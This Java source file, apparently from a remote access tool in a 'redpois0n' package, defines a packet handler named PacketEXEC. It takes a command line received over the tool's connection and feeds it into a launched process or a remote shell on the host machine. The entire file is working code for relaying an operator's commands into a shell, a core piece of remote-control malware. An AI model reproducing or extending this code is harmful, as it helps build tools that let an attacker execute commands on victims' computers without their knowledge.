package com.redpois0n.packets.incoming;

import java.io.PrintWriter;

import com.redpois0n.Connection;
import com.redpois0n.LaunchProcess;
import com.redpois0n.RemoteShell;


public class PacketEXEC extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String line = Connection.readLine();
		
		if (LaunchProcess.latest != null) {
			PrintWriter input = new PrintWriter(LaunchProcess.latest.p.getOutputStream(), true);
			input.println(line);
		} else if (RemoteShell.p != null) {
			PrintWriter input = new PrintWriter(RemoteShell.p.getOutputStream(), true);
			input.println(line);
		}
	}

}
